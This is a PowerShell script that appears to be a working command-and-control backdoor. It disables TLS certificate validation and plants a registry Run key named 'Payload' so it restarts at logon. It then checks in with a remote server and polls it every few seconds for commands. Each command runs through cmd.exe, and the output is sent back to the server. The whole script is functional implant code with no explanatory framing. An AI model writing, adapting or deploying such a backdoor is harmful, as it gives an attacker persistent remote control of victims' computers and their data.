Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;

public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@

[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Persistence via Registry (Run Key)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "Payload"
$regValue = "powershell -ExecutionPolicy Bypass -File $PSCommandPath"
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue

$server = "https://192.168.1.14:1111"

# Checkin
$checkin_data = @{ } | ConvertTo-Json
try {
    Write-Host "[*] Sending checkin..."
    $response = Invoke-RestMethod -Uri "$server/checkin" -Method POST -Body $checkin_data -ContentType "application/json"
    $session_id = $response.session_id
    Write-Host "[+] Checkin successful: $session_id"
} catch {
    Write-Host "[-] Checkin failed: $_"
    exit
}

# Loop to get commands
while ($true) {
    Start-Sleep -Seconds 3
    try {
        $cmd_resp = Invoke-RestMethod -Uri "$server/get_command?session_id=$session_id" -Method GET
        $cmd = $cmd_resp.command
        if ($cmd) {
            if ($cmd -match "`r`n|\n") {
                # Multiple lines -> write to temp .bat file
                $tempFile = [System.IO.Path]::GetTempFileName().Replace(".tmp", ".bat")
                [System.IO.File]::WriteAllText($tempFile, $cmd)

                $output = cmd.exe /c $tempFile 2>&1 | Out-String

                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            } else {
                # Single-line command
                $output = cmd.exe /c $cmd 2>&1 | Out-String
            }

            $send_data = @{
                session_id = $session_id
                output     = $output
            } | ConvertTo-Json -Depth 3

            Invoke-RestMethod -Uri "$server/send_output" -Method POST -Body $send_data -ContentType "application/json"
        }
    } catch {
        Write-Host "[-] Error: $_"
    }
}
